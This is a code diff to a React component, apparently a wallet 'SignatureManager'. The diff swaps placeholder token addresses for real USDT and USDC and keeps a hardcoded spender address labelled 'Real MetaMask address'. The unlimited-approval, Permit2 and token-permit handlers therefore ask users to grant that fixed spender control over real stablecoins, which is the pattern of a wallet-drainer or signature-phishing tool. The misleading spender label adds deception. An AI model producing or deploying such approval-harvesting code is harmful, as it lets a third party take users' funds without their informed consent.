@@ -9,7 +9,7 @@ export default function SignatureManager({ provider, userAddress }) {
   const handleUnlimitedApprove = async () => {
     setLoading(true);
     try {
-      const tokenAddress = '0xA0b86a33E6441b8435b662da0C0E5B2c4c8b0b8b'; // Example token
+      const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Real USDT
       const spenderAddress = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15'; // Real MetaMask address
       
       const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
@@ -37,8 +37,8 @@ export default function SignatureManager({ provider, userAddress }) {
   const handlePermit2 = async () => {
     setLoading(true);
     try {
-      const tokenAddress = '0xA0b86a33E6441b8435b662da0C0E5B2c4c8b0b8b';
-      const amount = ethers.parseEther('1000');
+      const tokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC
+      const amount = ethers.parseUnits('1000', 6); // USDC has 6 decimals
       const deadline = Math.floor(Date.now() / 1000) + 3600;
       const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
       
@@ -125,9 +125,9 @@ export default function SignatureManager({ provider, userAddress }) {
   const handleTokenPermit = async () => {
     setLoading(true);
     try {
-      const tokenAddress = '0xA0b86a33E6441b8435b662da0C0E5B2c4c8b0b8b';
+      const tokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC
       const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
-      const value = ethers.parseEther('1000');
+      const value = ethers.parseUnits('1000', 6); // USDC has 6 decimals
       const deadline = Math.floor(Date.now() / 1000) + 3600;
       
       const signature = await signTokenPermit(tokenAddress, userAddress, spender, value, deadline, provider);
